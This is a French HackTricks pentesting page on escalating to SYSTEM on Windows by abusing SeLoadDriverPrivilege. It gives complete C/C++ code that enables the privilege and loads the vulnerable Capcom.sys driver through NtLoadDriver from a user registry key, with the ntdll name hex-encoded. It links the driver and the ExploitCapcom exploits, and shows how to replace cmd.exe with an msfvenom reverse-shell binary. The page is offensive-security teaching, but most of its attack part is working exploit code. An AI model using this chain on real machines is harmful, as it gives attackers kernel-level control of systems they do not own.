# Abus du privilège SeLoadDriverPrivilege

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez** le [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SeLoadDriverPrivilege <a href="#seloaddriverprivilege" id="seloaddriverprivilege"></a>

Un privilège très dangereux à attribuer à n'importe quel utilisateur - il permet à l'utilisateur de charger des pilotes de noyau et d'exécuter du code avec des privilèges de noyau, alias `NT\System`. Voyez comment l'utilisateur `offense\spotless` possède ce privilège :

![](../../../.gitbook/assets/a8.png)

`Whoami /priv` montre que le privilège est désactivé par défaut :

![](../../../.gitbook/assets/a9.png)

Cependant, le code ci-dessous permet d'activer ce privilège assez facilement :

{% code title="privileges.cpp" %}
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

system("cmd");
return 0;
}
```
{% endcode %}

Nous compilons le code ci-dessus, l'exécutons et le privilège `SeLoadDriverPrivilege` est maintenant activé :

![](../../../.gitbook/assets/a10.png)

### Exploitation de la faille du pilote Capcom.sys <a href="#capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>

Pour prouver davantage que le `SeLoadDriverPrivilege` est dangereux, exploitons-le pour **élever les privilèges**.

Vous pouvez charger un nouveau pilote en utilisant **NTLoadDriver :**
```cpp
NTSTATUS NTLoadDriver(
_In_ PUNICODE_STRING DriverServiceName
);
```
Par défaut, le nom du service du pilote doit être sous `\Registry\Machine\System\CurrentControlSet\Services\`

Cependant, selon la **documentation**, vous **pouvez** également **utiliser** des chemins sous **HKEY\_CURRENT\_USER**, ce qui vous permet de **modifier** une **entrée de registre** pour **charger des pilotes arbitraires** sur le système.\
Les paramètres pertinents qui doivent être définis dans le nouveau registre sont :

* **ImagePath:** Valeur de type REG\_EXPAND\_SZ qui spécifie le chemin du pilote. Dans ce contexte, le chemin doit être un répertoire avec des autorisations de modification par l'utilisateur non privilégié.
* **Type**: Valeur de type REG\_WORD dans laquelle le type de service est indiqué. Pour notre objectif, la valeur doit être définie comme SERVICE\_KERNEL\_DRIVER (0x00000001).

Par conséquent, vous pouvez créer un nouveau registre dans **`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`** en indiquant dans **ImagePath** le chemin du pilote et dans **Type** la valeur 1, puis utiliser ces valeurs dans l'exploit (vous pouvez obtenir le SID de l'utilisateur en utilisant : `Get-ADUser -Identity 'NOM_UTILISATEUR' | select SID` ou `(New-Object System.Security.Principal.NTAccount("NOM_UTILISATEUR")).Translate([System.Security.Principal.SecurityIdentifier]).value`
```bash
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
```
Le premier déclare une variable de chaîne indiquant où se trouve le pilote vulnérable **Capcom.sys** sur le système de la victime et le second est une variable de chaîne indiquant un nom de service qui sera utilisé (peut être n'importe quel service).\
Notez que le **pilote doit être signé par Windows** donc vous ne pouvez pas charger des pilotes arbitraires. Cependant, **Capcom.sys** **peut être utilisé pour exécuter du code arbitraire et est signé par Windows**, donc l'objectif est de charger ce pilote et de l'exploiter.

Charger le pilote:
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

//system("cmd");
// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
std::cout << "[+] Set Registry Keys" << std::endl;
NTSTATUS st1;
UNICODE_STRING pPath;
UNICODE_STRING pPathReg;
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
HMODULE hObsolete = GetModuleHandleA(NTDLL);
*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

RtlInitUnicodeString(&pPath, pPathSource);
RtlInitUnicodeString(&pPathReg, pPathSourceReg);
st1 = NtLoadDriver(&pPathReg);
std::cout << "[+] value of st1: " << st1 << "\n";
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver Loaded as Kernel..\n";
std::cout << "[+] Press [ENTER] to unload driver\n";
}

getchar();
st1 = NtUnloadDriver(&pPathReg);
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver unloaded from Kernel..\n";
std::cout << "[+] Press [ENTER] to exit\n";
getchar();
}

return 0;
}
```
Une fois que le code ci-dessus est compilé et exécuté, nous pouvons voir que notre pilote malveillant `Capcom.sys` est chargé sur le système de la victime :

![](../../../.gitbook/assets/a11.png)

Téléchargement : [Capcom.sys - 10 Ko](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)

**Maintenant, il est temps d'abuser du pilote chargé pour exécuter du code arbitraire.**

Vous pouvez télécharger des exploits depuis [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) et [https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings) et les exécuter sur le système pour élever nos privilèges à `NT Authority\System` :

![](../../../.gitbook/assets/a12.png)

### Pas d'interface graphique

Si nous n'avons **pas accès à l'interface graphique** de la cible, nous devrons modifier le code **`ExploitCapcom.cpp`** avant de le compiler. Ici, nous pouvons éditer la ligne 292 et remplacer `C:\\Windows\\system32\\cmd.exe"` par, par exemple, un binaire de shell inversé créé avec `msfvenom`, par exemple : `c:\ProgramData\revshell.exe`.

Code : c
```c
// Launches a command shell process
static bool LaunchShell()
{
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
PROCESS_INFORMATION ProcessInfo;
STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
&ProcessInfo))
{
return false;
}

CloseHandle(ProcessInfo.hThread);
CloseHandle(ProcessInfo.hProcess);
return true;
}
```
La chaîne `CommandLine` dans cet exemple serait modifiée en :

Code : c
```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
### Automatique

Vous pouvez utiliser [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) pour **activer automatiquement** le **privilège**, **créer** la **clé de registre** sous HKEY\_CURRENT\_USER et **exécuter NTLoadDriver** en indiquant la clé de registre que vous souhaitez créer et le chemin vers le pilote :

![](<../../../.gitbook/assets/image (289).png>)

Ensuite, vous devrez télécharger un exploit **Capcom.sys** et l'utiliser pour escalader les privilèges.
